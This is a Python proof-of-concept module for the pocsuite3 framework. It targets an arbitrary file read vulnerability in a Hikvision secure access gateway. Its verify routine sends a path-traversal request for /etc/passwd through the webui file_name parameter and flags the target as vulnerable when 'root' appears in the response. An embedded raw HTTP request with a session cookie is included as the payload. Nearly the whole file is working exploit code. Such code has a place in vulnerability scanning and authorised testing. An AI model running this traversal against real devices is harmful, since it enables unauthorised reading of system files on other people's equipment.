# _*_ coding:utf-8 _*_
# @Time : 2023/12/26 13:53
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class hikvision_gateway(POCBase):
    pocDesc = '''海康威视安全接入网关任意文件读取漏洞'''
    vulID = '20231226'
    version = '1'
    author = '公众号网络安全透视镜'
    vulDate = '2023-12-26'
    createDate = '2023-12-26'
    updateDate = '2023-12-26'
    name = '海康威视安全接入网关任意文件读取漏洞'
    appName = '海康威视'

    def _verify(self):

        result = {}
        url = self.url + '/webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            "Content-Type": "application/x-www-form-urlencoded"
        }
        payload = """
                    GET /webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down HTTP/1.1
                    Host: 
                    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
                    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
                    Accept-Encoding: gzip, deflate
                    Connection: close
                    Cookie: USGSESSID=b75bce9897c9e543ab7be9ac44af4f76
                    Upgrade-Insecure-Requests: 1
        """

        try:
            response = requests.get(url, headers=headers,verify=False)
            text = response.text
            if response.status_code == 200 and 'root' in text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(hikvision_gateway)